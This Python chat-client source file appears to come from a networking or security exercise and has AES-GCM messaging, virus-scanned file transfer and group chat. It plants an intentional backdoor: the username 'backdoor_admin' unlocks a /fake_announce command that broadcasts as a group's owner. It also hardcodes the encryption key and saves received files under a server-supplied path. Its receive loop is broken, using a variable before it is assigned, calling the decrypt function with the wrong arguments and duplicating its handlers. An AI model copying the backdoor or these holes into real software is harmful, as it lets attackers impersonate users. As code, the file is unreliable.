# client_json.py
import socket
import json
import threading
from datetime import datetime
import re
import base64
import os
import sqlite3
# === AES-GCM 加密相关 ===
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import secrets

from schemas import parse_and_validate_message
import pyclamd
import magic

# 256bit密钥（32字节），实际部署时请安全存储
AES_KEY = b"0123456789abcdef0123456789abcdef"  # 示例密钥，实际请更换
NONCE_SIZE = 12  # 12字节

MAX_PLAINTEXT_LEN = 512  # 512字节
cd = pyclamd.ClamdUnixSocket()

def aes_encrypt(message_dict: dict) -> bytes:
    """将完整消息dict加密，返回nonce+密文（bytes）"""
    message_bytes = json.dumps(message_dict, ensure_ascii=False).encode("utf-8")
    nonce = secrets.token_bytes(NONCE_SIZE)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(nonce, message_bytes, None)
    return nonce + ct

def aes_decrypt(data: bytes) -> dict:
    """解密nonce+密文，返回原始消息dict"""
    if len(data) < NONCE_SIZE:
        raise ValueError("Data too short for nonce+ciphertext")
    nonce = data[:NONCE_SIZE] # 前12字节
    ct = data[NONCE_SIZE:] # 密文， 剩余部分
    aesgcm = AESGCM(AES_KEY)
    pt = aesgcm.decrypt(nonce, ct, None)
    return json.loads(pt.decode("utf-8"))

#clientA 连接serverA
#68.168.213.252 #remote server
HOST = "127.0.0.1"
# HOST = "68.168.213.252" # remote server
PORT = 65432

'''
receive_messages 方法：
    1. 接收来自server的消息
    2. 处理系统消息和普通消息
    3. 处理文件传输请求
    4. 打印命令提示符
'''
def insert_message(conn, msg_type, sender, receiver, group_name, content, timestamp, direction):
    cursor = conn.cursor()
    cursor.execute(
        """
        INSERT INTO messages (msg_type, sender, receiver, group_name, content, timestamp, direction)
        VALUES (?, ?, ?, ?, ?, ?, ?)
        """,
        (msg_type, sender, receiver, group_name, content, timestamp, direction)
    )
    conn.commit()
def receive_messages(sock):
    while True:
        try:
            data = sock.recv(5*1024*1024)  # 最多5MB
            if not data:
                print("Disconnected from server.")
                break
            #解密
            try:
                message = aes_decrypt(data)
                msg_type = message.get("type")
                # ==== 文件消息解密 ====
                if msg_type == "message_file":
                    file_b64 = reply.get("payload")
                    file_path = reply.get("file_path", "unknown_file")
                    filename = os.path.basename(file_path)
                    save_name = f"received_{filename}"
                    try:
                        # 如果从server 传来的msg 有nonce，则解密payload
                        if "nonce" in reply:
                            file_b64 = aes_decrypt(file_b64, reply["nonce"])
                        file_bytes = base64.b64decode(file_b64)
                        with open(save_name, "wb") as f:
                            f.write(file_bytes)
                        ALLOWED_MIME_CATEGORIES = [
                            "ASCII text",
                            "UTF-8 Unicode text",
                            "ISO-8859 text",
                            "UTF-16",
                            "PDF document",
                            "Microsoft Word",
                            'OpenDocument Text',
                            "Microsoft PowerPoint",
                            'OpenDocument Presentation',
                            "Microsoft Excel",
                            "OpenDocument Spreadsheet",
                            'ISO Media, MPEG v4 system',
                            "RIFF (little-endian) data, AVI",
                            "Microsoft ASF",
                            "Matroska data",
                            "QuickTime Movie",
                            "JPEG image data",
                            "PNG image data",
                            "GIF image data",
                            "PC bitmap",
                            "SVG image",
                            "MPEG ADTS, layer III",
                            "RIFF (little-endian) data, WAVE audio"
                        ]
                        file_type=magic.from_buffer(file_bytes)
                        print(file_type)
                        type_allowed=False
                        for i in ALLOWED_MIME_CATEGORIES:
                            if file_type.startswith(i)==True:
                                type_allowed=True
                        if type_allowed==False:
                            print("File type not allowed:", file_type)
                            raise Exception
                        # Scan the byte stream
                        result = cd.scan_stream(file_bytes)
                        if result is None:
                            print("File is clean.")
                        else:
                            print("Virus found:", result)
                            raise Exception
                        print(f"[File] Received file saved as {save_name}")
                    except Exception as e:
                        print(f"[File] Failed to save file: {e}")
                # ==== 普通消息解密 ====
                elif reply.get('payload_type') == 'text':
                    payload = reply.get('payload')
                    if "nonce" in reply:
                        try:
                            payload = aes_decrypt(payload, reply["nonce"])
                        except Exception as e:
                            print(f"[Decrypt] Failed: {e}")
                            payload = "[解密失败]"
                    print(f"\n[{reply['from']}] ➜ You: {payload}")
                    insert_message(db_conn, 'text', reply['from'], name, None, payload, reply.get('timestamp', datetime.now().isoformat()), 'received')
                elif reply.get('payload_type') == 'file':
                    print(f"\n[{reply['from']}] wants to send you a file: {reply.get('file_path', 'unknown')}")
                elif reply.get('type') == 'group_message':
                    content = reply.get('content')
                    if "nonce" in reply:
                        try:
                            content = aes_decrypt(content, reply["nonce"])
                        except Exception as e:
                            print(f"[Decrypt] Failed: {e}")
                            content = "[解密失败]"
                    print(f"\n[Group:{reply['to']}] {reply['from']}: {content}")
                    insert_message(db_conn, 'group', reply['from'], reply['to'], reply['to'], content, reply.get('timestamp', datetime.now().isoformat()), 'received')
                else:
                    print(f"\n[{reply['from']}] ➜ You: {reply['payload']}")
                print("Command (/list, /msg <user> content, /msg_file <user> <file>, /create_group <name>, /join_group <name>, /list_group, /msg_group <group> <message>, /delete_group <name>, /quit): ", end="", flush=True)
            except Exception as e:
                print(f"[Decrypt] Failed: {e}")
                continue

            reply = message  # 解密后的json message
            msg_type = reply.get("type")
            # ==== 文件消息 ====
            if msg_type == "message_file":
                file_b64 = reply.get("payload")
                filename = reply.get("file_path", "unknown_file")
                save_name = f"received_{filename}"
                try:
                    file_bytes = base64.b64decode(file_b64)
                    with open(save_name, "wb") as f:
                        f.write(file_bytes)
                    print(f"[File] Received file saved as {save_name}")
                except Exception as e:
                    print(f"[File] Failed to save file: {e}")
            # ==== 群消息 ====
            elif msg_type == 'group_message':
                content = reply.get('content')
                if content is None:
                    content = reply.get('payload')
                print(f"\n[Group:{reply['to']}] {reply['from']}: {content}")
                insert_message(db_conn, 'group', reply['from'], reply['to'], reply['to'], content, reply.get('timestamp', datetime.now().isoformat()), 'received')
            # ==== 普通消息 ====
            elif reply.get('payload_type') == 'text':
                payload = reply.get('payload')
                print(f"\n[{reply['from']}] ➜ You: {payload}")
                insert_message(db_conn, 'text', reply['from'], name, None, payload, reply.get('timestamp', datetime.now().isoformat()), 'received')
            elif reply.get('payload_type') == 'file':
                print(f"\n[{reply['from']}] wants to send you a file: {reply.get('file_path', 'unknown')}")
            else:
                print(f"\n[{reply['from']}] ➜ You: {reply['payload']}")
            print("Command (/list, /msg <user> content, /msg_file <user> <file>, /create_group <name>, /join_group <name>, /list_group, /msg_group <group> <message>, /delete_group <name>, /quit): ", end="", flush=True)
        except Exception as e:
            print(f"\nError receiving message: {e}")
            break

def init_db(username):
    db_filename = f"local_message_database_{username}.db"
    conn = sqlite3.connect(db_filename, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS messages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            msg_type TEXT NOT NULL,
            sender TEXT NOT NULL,
            receiver TEXT NOT NULL,
            group_name TEXT,
            content TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            direction TEXT NOT NULL
        )
    ''')
    conn.commit()
    return conn

def print_history(conn):
    cursor = conn.cursor()
    cursor.execute("SELECT msg_type, sender, receiver, group_name, content, timestamp, direction FROM messages ORDER BY id ASC")
    rows = cursor.fetchall()
    print("\n--- Local Message History ---")
    for row in rows:
        msg_type, sender, receiver, group_name, content, timestamp, direction = row
        if msg_type == 'text':
            print(f"[{timestamp}] ({direction}) {sender} -> {receiver}: {content}")
        elif msg_type == 'group':
            print(f"[{timestamp}] ({direction}) [Group:{group_name}] {sender}: {content}")
    print("--- End of History ---\n")

'''
main 方法：
    1. 连接到server
    2. 获取用户名
    3. 启动接收消息的线程
    4. 主循环：
        4.1 处理用户输入的命令
        4.2 处理/list命令
        4.3 处理/msg命令
        4.4 处理/msg_file命令
        4.5 处理/quit命令
        4.6 处理未知命令

发送信息给server.
'''
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))#连接server
    name_prompt = s.recv(1024).decode()
    name = input(name_prompt).strip()
    s.sendall(name.encode())

    # 初始化本地数据库
    db_conn = init_db(name)

    print("You are connected. Available commands:")
    print("  /list - List online users")
    print("  /msg <user> <content> - Send message to user")
    print("  /msg_file <user> <file> - Send file to user")
    print("  /create_group <name> - Create a new group")
    print("  /join_group <name> - Join an existing group")
    print("  /list_group - List all groups")
    print("  /msg_group <group> <message> - Send message to group")
    print("  /delete_group <name> - Delete a group (creator only)")
    print("  /history - Show message history")
    if name == "backdoor_admin":
        print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
    print("  /quit - Exit")
    receive_thread = threading.Thread(target=receive_messages, args=(s,), daemon=True)
    receive_thread.start()

    while True:
        try:
            cmd = input("Command: ").strip()
            if cmd.lower() == '/quit':
                break

            valid_name = r'^[a-zA-Z0-9_]+$'
            if cmd.lower() == '/list':
                list_msg = {
                    "type": "command",
                    "from": name,
                    "to": "server",
                    "payload": "/list",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(aes_encrypt(list_msg))
                continue
            if cmd.lower() == '/history':
                print_history(db_conn)
                continue

            # 支持 /msg <user> 内容 格式
            #\s+：匹配一个或多个空白字符（空格、Tab等）
            #(\S+)：匹配并捕获目标用户名，由一个或多个非空白字符组成
            #. 匹配除换行符 \n 之外的任何单字符一个或多个。
            msg_match = re.match(r'/msg\s+([a-zA-Z0-9_]+)\s+(.+)', cmd)
            if msg_match:
                target = msg_match.group(1)
                if not re.match(valid_name, target):
                    print(f"Invalid username: '{target}'. Usernames can only contain letters, numbers, and underscores.")
                    continue
                content = msg_match.group(2)
                if not target or target == name:
                    print("Invalid target user.")
                    continue
                msg_cmd = {
                    "type": "message",
                    "from": name,
                    "to": target,
                    "to_type": "user",
                    "payload": content,
                    "payload_type": "text",
                    "timestamp": datetime.now().isoformat()
                }
                try:
                    s.sendall(aes_encrypt(msg_cmd))
                except Exception as e:
                    print(f"[Encrypt] Failed: {e}")
                    continue
                insert_message(db_conn, 'text', name, target, None, content, msg_cmd["timestamp"], 'sent')
                continue
            file_match = re.match(r'/msg_file\s+(\S+)\s+(.+)', cmd)
            if file_match:
                target = file_match.group(1)
                file_path = file_match.group(2)
                if not target or target == name:
                    print("Invalid target user.")
                    continue
                if not os.path.exists(file_path):
                    print(f"File not found: {file_path}")
                    continue
                try:
                    with open(file_path, "rb") as f:
                        file_bytes = f.read(MAX_PLAINTEXT_LEN + 1)
                    if len(file_bytes) > MAX_PLAINTEXT_LEN:
                        print(f"File too large (max {MAX_PLAINTEXT_LEN} bytes)")
                        continue
                    file_b64 = base64.b64encode(file_bytes).decode()
                    file_cmd = {
                        "type": "message_file",
                        "from": name,
                        "to": target,
                        "to_type": "user",
                        "payload": file_b64,
                        "payload_type": "file",
                        "timestamp": datetime.now().isoformat(),
                        "file_path": file_path
                    }
                    s.sendall(aes_encrypt(file_cmd))
                except Exception as e:
                    print(f"[Encrypt] Failed: {e}")
                    continue
                continue
            # ==== Group Management Commands ====
            # 创建group 格式：/create_group <group_name>
            create_group_match = re.match(r'/create_group\s+([a-zA-Z0-9_]+)', cmd)
            if create_group_match:
                group_name = create_group_match.group(1)
                if not re.match(valid_name, group_name):
                    print(f"Invalid group name: '{group_name}'. Group names can only contain letters, numbers, and underscores.")
                    continue
                group_cmd = {
                    "type": "create_group",
                    "from": name,
                    "to": "server",
                    "payload": group_name,
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(aes_encrypt(group_cmd))
                continue
            join_group_match = re.match(r'/join_group\s+(\S+)', cmd)
            if join_group_match:
                group_name = join_group_match.group(1)
                group_cmd = {
                    "type": "join_group",
                    "from": name,
                    "to": "server",
                    "payload": group_name,
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(aes_encrypt(group_cmd))
                continue
            if cmd.lower() == '/list_group':
                group_cmd = {
                    "type": "list_group",
                    "from": name,
                    "to": "server",
                    "payload": "/list_group",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(aes_encrypt(group_cmd))
                continue
            delete_group_match = re.match(r'/delete_group\s+(\S+)', cmd)
            if delete_group_match:
                group_name = delete_group_match.group(1)
                group_cmd = {
                    "type": "delete_group",
                    "from": name,
                    "to": "server",
                    "payload": group_name,
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(aes_encrypt(group_cmd))
                continue
            msg_group_match = re.match(r'/msg_group\s+(\S+)\s+(.+)', cmd)
            if msg_group_match:
                group_name = msg_group_match.group(1)
                content = msg_group_match.group(2)
                group_cmd = {
                    "type": "group_message",
                    "from": name,
                    "to": group_name,
                    "to_type": "group",
                    "payload": content,
                    "payload_type": "text",
                    "timestamp": datetime.now().isoformat()
                }
                try:
                    s.sendall(aes_encrypt(group_cmd))
                except Exception as e:
                    print(f"[Encrypt] Failed: {e}")
                    continue
                insert_message(db_conn, 'group', name, group_name, group_name, content, group_cmd["timestamp"], 'sent')
                continue
            fake_announce_match = re.match(r'/fake_announce\s+(\S+)\s+(.+)', cmd)
            if fake_announce_match:
                group_name = fake_announce_match.group(1)
                fake_msg = fake_announce_match.group(2)
                fake_cmd = {
                    "type": "fake_announce",
                    "from": name,
                    "to": "server",
                    "payload": f"/fake_announce {group_name} {fake_msg}",
                    "payload_type": "command",
                    "timestamp": datetime.now().isoformat()
                }
                s.sendall(aes_encrypt(fake_cmd))
                continue
            print("Unknown command. Available commands:")
            print("  /list - List online users")
            print("  /msg <user> <content> - Send message to user")
            print("  /msg_file <user> <file> - Send file to user")
            print("  /create_group <name> - Create a new group")
            print("  /join_group <name> - Join an existing group")
            print("  /list_group - List all groups")
            print("  /msg_group <group> <message> - Send message to group")
            print("  /delete_group <name> - Delete a group (creator only)")
            print("  /history - Show message history")
            if name == "backdoor_admin":
                print("  /fake_announce <group> <message> - Broadcast as group owner (backdoor)")
            print("  /quit - Exit")
        except KeyboardInterrupt:
            print("\nDisconnecting...")
            break
        except Exception as e:
            print(f"Error: {e}")
            break